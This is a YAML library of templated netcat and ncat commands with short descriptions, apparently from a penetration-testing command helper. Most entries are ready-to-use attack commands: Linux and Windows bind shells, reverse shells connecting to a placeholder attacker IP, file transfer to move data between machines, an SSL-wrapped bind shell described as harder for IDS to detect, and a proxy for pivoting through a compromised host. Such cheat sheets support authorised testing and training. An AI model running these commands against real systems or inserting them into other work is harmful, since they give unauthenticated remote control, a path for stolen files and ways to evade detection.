actions:
  # === BASIC CONNECTIVITY AND SCANNING ===
  - title: nc - port scanning
    desc: |
      Performs a basic TCP port scan on a specific target. The -z flag ensures
      that nc does not send any data once the connection is established, making
      it ideal for scanning. The -v flag provides verbose output to indicate
      whether a port is open or closed.
    command: "nc -zv {{target}} {{port_range|1-1000}}"

  - title: nc - banner grabbing
    desc: |
      Connects to a specific port to retrieve the service banner. This is a 
      fundamental step in reconnaissance to identify the software and version 
      running on a port. Simply connecting and pressing 'Enter' often triggers
       the service to reveal its identification string.
    command: "nc -v {{target}} {{port}}"

  # === LISTENER SETUP ===
  - title: nc - basic tcp listener
    desc: |
      Sets up a TCP listener on the specified local port. This is frequently used
      to receive incoming data or to catch a reverse shell during an exploit. 
      The -l flag tells nc to listen, while -p specifies the port and -v enables
      verbose logging for incoming connections.
    command: "nc -nlvp {{lport|4444}}"

  # === BIND SHELLS ===
  - title: nc - bind shell linux
    desc: |
      Binds a bash shell to a local port on a Linux system. When a remote user
      connects to this port, they are immediately granted access to the bash
      environment. This is highly insecure and should only be used in 
      controlled environments as it lacks any form of authentication.
    command: "nc -nlvp {{lport|4444}} -e /bin/bash"

  - title: nc - bind shell windows
    desc: |
      Binds the Windows command prompt (cmd.exe) to a local port. This allows
      anyone who connects to that port to execute commands on the host machine.
      Ensure the local firewall is configured to allow traffic on the chosen 
      port for this to work successfully.
    command: "nc -nlvp {{lport|4444}} -e cmd.exe"

  # === REVERSE SHELLS ===
  - title: nc - reverse shell linux
    desc: |
      Initiates a reverse shell from a Linux target back to an attacker's listener.
      This technique is used to bypass restrictive inbound firewall rules by 
      initiating an outbound connection. The attacker must have a listener
      running (e.g., nc -lvp) on the specified IP and port before executing this.
    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e /bin/bash"

  - title: nc - reverse shell windows
    desc: |
      Connects back to an attacker's machine and provides a Windows cmd.exe shell.
      It is a common method for maintaining access after a successful exploit on
      a Windows system. Note that modern antivirus or EDR solutions may detect
      and block this behavior.
    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e cmd.exe"

  # === FILE TRANSFER ===
  - title: nc - receive file
    desc: |
      Sets up a listener to receive a file and save it to the local disk.
      The output redirection operator (>) is used to capture the incoming 
      stream and write it to the specified file name. Start this listener 
      before the sender starts their connection.
    command: "nc -nlvp {{lport|4445}} > {{incoming_file}}"

  - title: nc - send file
    desc: |
      Sends a local file to a remote listener by redirecting the file content 
      into the nc connection. This is a quick way to transfer scripts, binaries,
      or data between machines without needing SSH or FTP. The receiver must 
      be listening for the connection to be successful.
    command: "nc -nv {{target_ip}} {{port|4445}} < {{file_to_send}}"

  # === NCAT ADVANCED FEATURES ===
  - title: ncat - bind shell with ssl and access control
    desc: |
      Creates an encrypted bind shell that only allows a specific source IP to
      connect. Using the --ssl flag encrypts the traffic, making it harder for 
      IDS systems to detect the shell commands. The --allow flag provides a 
      basic layer of security by filtering who can connect.
    command: "ncat --exec {{shell_path|/bin/bash}} --allow {{allowed_ip}} -vnl {{port|4444}} --ssl"

  - title: ncat - secure connection with ssl
    desc: |
      Connects to a remote listener using SSL/TLS encryption. This is used to
      interact with ncat listeners that have SSL enabled, ensuring the 
      entire communication remains private. This can also be used to test
      SSL-wrapped services like HTTPS or SMTPS.
    command: "ncat -v {{target_ip}} {{port|4444}} --ssl"

  - title: ncat - http proxy mode
    desc: |
      Turns ncat into a simple HTTP proxy server. This can be used for pivoting
      traffic through a compromised machine or to route web traffic through
      a specific network interface. This proxy does not support authentication 
      in its simplest form.
    command: "ncat --listen --proxy-type http {{lport|8080}}"
